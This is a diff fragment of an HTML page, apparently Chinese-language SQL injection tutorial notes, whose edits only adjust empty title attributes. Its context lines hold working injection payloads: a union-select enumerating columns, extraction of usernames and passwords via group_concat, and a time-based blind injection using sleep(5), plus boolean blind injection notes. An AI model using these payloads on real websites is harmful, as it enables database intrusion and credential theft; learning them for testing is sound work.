@@ -504,7 +504,7 @@ select * from users where id =x
 
 <pre><code>    语句：-1&#39; union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;表格名&#39;,3#
 </code></pre>
-<h6 id="获取字段值"><a href="#获取字段值" class="headerlink" title="获取字段值"></a>获取字段值</h6><h6 id=""><a href="#" class="headerlink" title=""></a></h6><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">关键：group_concat(id,username,password) from geekuser</code></pre>
+<h6 id="获取字段值"><a href="#获取字段值" class="headerlink" title="获取字段值"></a>获取字段值</h6><h6 id><a href="#" class="headerlink" title></a></h6><pre class=" language-highlight plaintext"><code class="language-highlight plaintext">关键：group_concat(id,username,password) from geekuser</code></pre>
 
 
 
@@ -559,7 +559,7 @@ select * from users where id =x
 <p>个人感觉方法二更快，方法一还得去 ASCII 表对着找</p>
 <pre class=" language-highlight plaintext"><code class="language-highlight plaintext">?id=1&#x27; and if(left((select group_concat(username,password) from users),1)=&#x27;D&#x27;,sleep(5),1)--+</code></pre>
 
-<h4 id="-1"><a href="#-1" class="headerlink" title=""></a></h4><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a><strong>布尔盲注</strong></h4><p><strong>使用场景：</strong>适用于页面没有回显字段(不支持联合查询)，且web页面返回True 或者 false</p>
+<h4 id="-1"><a href="#-1" class="headerlink" title></a></h4><h4 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a><strong>布尔盲注</strong></h4><p><strong>使用场景：</strong>适用于页面没有回显字段(不支持联合查询)，且web页面返回True 或者 false</p>
 <p>布尔盲注主要用到 <strong>length()<strong>、</strong>ascii()<strong>、</strong>substr()</strong> 这三个函数</p>
 <p><strong>步骤：</strong></p>
 <blockquote>
